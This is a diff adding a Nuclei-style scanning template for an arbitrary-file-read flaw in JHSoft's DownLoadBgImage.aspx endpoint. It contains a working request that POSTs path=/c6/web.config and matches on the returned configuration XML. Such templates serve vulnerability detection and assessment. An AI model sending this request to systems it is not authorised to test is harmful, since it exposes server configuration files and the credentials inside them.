@@ -1,0 +1,28 @@
+id: JHSoft-DownLoadBgImage-ReadAnyFile
+
+info:
+  name: JHSoft-DownLoadBgImage-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    JHSoft-DownLoadBgImage-ReadAnyFile vulnerability allows an attacker to read arbitrary files from the server.
+
+http:
+  - raw:
+      - |
+        POST /c6/Jhsoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        path=/c6/web.config
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<?xml version=\"1.0\""
+          - "<configuration>"
+        condition: and
